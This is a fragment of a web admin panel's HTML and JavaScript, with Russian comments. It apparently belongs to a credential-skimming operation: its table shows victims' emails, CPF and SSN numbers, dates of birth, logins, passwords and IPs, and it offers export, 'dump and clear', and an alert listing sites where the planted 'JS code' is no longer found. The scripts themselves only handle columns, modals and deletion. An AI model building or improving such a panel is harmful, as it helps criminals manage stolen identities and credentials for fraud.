                    <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="email" checked>
                        <span class="text-yellow-500">Email</span>
                    </label>
					<label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="CPF" checked>
                        <span class="text-yellow-500">CPF</span>
                    </label>
					<label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="SSN" checked>
                        <span class="text-yellow-500">SSN</span>
                    </label>
					<label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="DOB" checked>
                        <span class="text-yellow-500">DOB</span>
                    </label>
					<label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="Other" checked>
                        <span class="text-yellow-500">Other</span>
                    </label>
					<label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="ip" checked>
                        <span class="text-yellow-500">IP</span>
                    </label>
                    <label class="flex items-center">
                        <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="date" checked>
                        <span class="text-yellow-500">Date</span>
                    </label>
					<label class="flex items-center">
                       <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="login" checked>
    <span class="text-yellow-500">Login</span>
</label>
<label class="flex items-center">
    <input type="checkbox" class="form-checkbox text-yellow-500 bg-navy border-gold mr-2" data-column="password" checked>
    <span class="text-yellow-500">Password</span>
</label>
                </div>
            </div>
            <div class="px-4 py-3 bg-gray-800 text-right">
                <center><button id="applyTableSettingsBtn" class="bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 px-4 rounded">
                    Save
                </button></center>
            </div>
        </div>
    </div>
</div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', (event) => {
        var table = document.querySelector('.my-table');
        var sidebar = document.querySelector('.sidebar');

        if (table && sidebar) {
            var topNav = document.querySelector('.top-nav');
            if (topNav) {
                var totalWidth = table.offsetWidth + sidebar.offsetWidth;
                topNav.style.minWidth = totalWidth + 'px';
            }
        }
    });

    var currentId;

    function showMenu(e, id, urlId) {
        currentId = id;
        e.preventDefault();
        var menu = document.getElementById('popupMenu');
        var editLink = document.getElementById('editLink');
        editLink.href = 'includes/details.php?id=' + id + '&url_id=' + urlId;
        menu.style.display = 'block';
        menu.style.left = e.pageX + 'px';
        menu.style.top = e.pageY + 'px';
    }

    window.onclick = function(event) {
        if (!event.target.matches('.text-blue-700')) {
            var menu = document.getElementById('popupMenu');
            if (menu) {
                menu.style.display = 'none';
            }
        }
    };

    function deleteRecord(e) {
        e.preventDefault();
        if (confirm('Вы уверены, что хотите удалить эту запись?')) {
            window.location.href = 'includes/delete.php?id=' + currentId;
        }
    }
</script>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const customizeTableBtn = document.getElementById('customizeTableBtn');
        const customizeTableModal = document.getElementById('customizeTableModal');
        const applyTableSettingsBtn = document.getElementById('applyTableSettingsBtn');

        // Загрузка сохраненных настроек столбцов из localStorage
        const savedColumnSettings = localStorage.getItem('columnSettings');
    if (savedColumnSettings) {
        const columnSettings = JSON.parse(savedColumnSettings);
        applyColumnSettings(columnSettings);
        setCheckboxStates(columnSettings);
    }

        customizeTableBtn.addEventListener('click', function() {
            customizeTableModal.classList.remove('hidden');
        });

        applyTableSettingsBtn.addEventListener('click', function() {
    const columnSettings = {};
    const checkboxes = customizeTableModal.querySelectorAll('input[type="checkbox"]');
    checkboxes.forEach(function(checkbox) {
        columnSettings[checkbox.dataset.column] = checkbox.checked;
    });

    applyColumnSettings(columnSettings);
    customizeTableModal.classList.add('hidden');
});

      function applyColumnSettings(columnSettings) {
    for (const column in columnSettings) {
        const cells = document.querySelectorAll(`.table-column[data-column="${column}"]`);
        cells.forEach(function(cell) {
            cell.style.display = columnSettings[column] ? 'table-cell' : 'none';
        });
    }

    // Сохранение состояния чекбоксов в localStorage
    localStorage.setItem('columnSettings', JSON.stringify(columnSettings));
}
    });
</script>

<script>
    var userRole = '<?php echo $userRole; ?>';

    document.addEventListener('DOMContentLoaded', function() {
        if (userRole === 'admin') {
            function loadMissingSites() {
                fetch('file_js/missing_sites.json')
                    .then(response => response.json())
                    .then(missingSites => {
                        if (missingSites && missingSites.length > 0) {
                            addMissingCodeBlock(missingSites);
                        }
                    })
                    .catch(error => console.log('Error loading missing sites:', error));
            }

            loadMissingSites();

            function addMissingCodeBlock(sites) {
                const blinkText = document.createElement('div');
                blinkText.innerHTML = 'JS code not found';
                blinkText.classList.add('blink');

                const lunaCheckForm = document.getElementById('lunaCheckForm');
                const container = lunaCheckForm.parentNode;

                container.classList.add('flex-container');
                container.appendChild(blinkText);

                blinkText.addEventListener('click', function() {
                    showPopup(sites);
                });
            }

            function showPopup(sites) {
                let popupContent = '<div class="popup-inner"><ul>';
                sites.forEach(site => {
                    popupContent += `<li><a href="${site}" target="_blank">${site}</a></li>`;
                });
                popupContent += '</ul></div>';

                const popup = document.createElement('div');
                popup.innerHTML = popupContent;
                document.body.appendChild(popup);
                popup.classList.add('popup');

                window.addEventListener('click', function(event) {
                    if (event.target === popup) {
                        popup.remove();
                    }
                });
            }
        }
    });
</script>
<script>function setCheckboxStates(columnSettings) {
    const checkboxes = customizeTableModal.querySelectorAll('input[type="checkbox"]');
    checkboxes.forEach(function(checkbox) {
        checkbox.checked = columnSettings[checkbox.dataset.column] !== false;
    });
}</script>

<script>
    var modal = document.getElementById("exportModal");
    var span = document.getElementsByClassName("close")[0];
    var exportForm = document.querySelector("#exportModal form");

    function showExportModal(urlId) {
    document.getElementById('exportUrlId').value = urlId;
    exportForm.action = "includes/export.php";
    modal.style.display = "block";
}

function showExportModalAll() {
    document.getElementById('exportUrlId').value = '';
    exportForm.action = "includes/export.php";
    modal.style.display = "block";
}

    function showDumpAndClearModal() {
		 document.getElementById('exportUrlId').value = '';
        exportForm.action = "includes/export.php?clear=1";
        modal.style.display = "block";
    }

    span.onclick = function () {
        modal.style.display = "none";
    }

    window.onclick = function (event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }
	document.getElementById('closeCustomizeTableModal').addEventListener('click', function() {
    document.getElementById('customizeTableModal').classList.add('hidden');
});
</script>
<script>
document.addEventListener('DOMContentLoaded', function() {
    var selectAllCheckbox = document.getElementById('selectAll');
    var checkboxes = document.getElementsByName('selected_ids[]');
    var deleteSelectedBtn = document.getElementById('deleteSelectedBtn');

    // Функция для проверки, выбрана ли хотя бы одна запись
    function checkSelectedRows() {
        var isSelected = false;
        for (var i = 0; i < checkboxes.length; i++) {
            if (checkboxes[i].checked) {
                isSelected = true;
                break;
            }
        }
        deleteSelectedBtn.style.display = isSelected ? 'inline-block' : 'none';
    }

    // Обработчик события изменения состояния чекбокса
    function handleCheckboxChange() {
        checkSelectedRows();
    }

    // Добавляем обработчик события для каждого чекбокса
    for (var i = 0; i < checkboxes.length; i++) {
        checkboxes[i].addEventListener('change', handleCheckboxChange);
    }

    selectAllCheckbox.addEventListener('change', function() {
        for (var i = 0; i < checkboxes.length; i++) {
            checkboxes[i].checked = selectAllCheckbox.checked;
        }
        checkSelectedRows();
    });
});
</script>
</body> </html> 